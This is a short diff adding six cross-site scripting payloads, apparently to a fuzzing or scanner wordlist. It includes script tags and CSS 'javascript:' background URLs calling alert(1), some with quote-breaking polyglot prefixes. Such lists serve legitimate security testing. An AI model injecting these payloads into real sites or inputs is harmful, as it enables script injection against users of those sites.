@@ -1,0 +1,6 @@
+[CSS_XSS] [GENERIC] <style></style><script>alert(1)</script>
+[CSS_XSS] [POLYGLOT] "><style></style><script>alert(1)</script>
+[CSS_XSS] [POLYGLOT] '><style></style><script>alert(1)</script>
+[CSS_XSS] [GENERIC] <style>body{background:url("javascript:alert(1)")}</style>
+[CSS_XSS] [POLYGLOT] '><style>body{background:url("javascript:alert(1)")}</style>
+[CSS_XSS] [POLYGLOT] "><style>body{background:url("javascript:alert(1)")}</style>
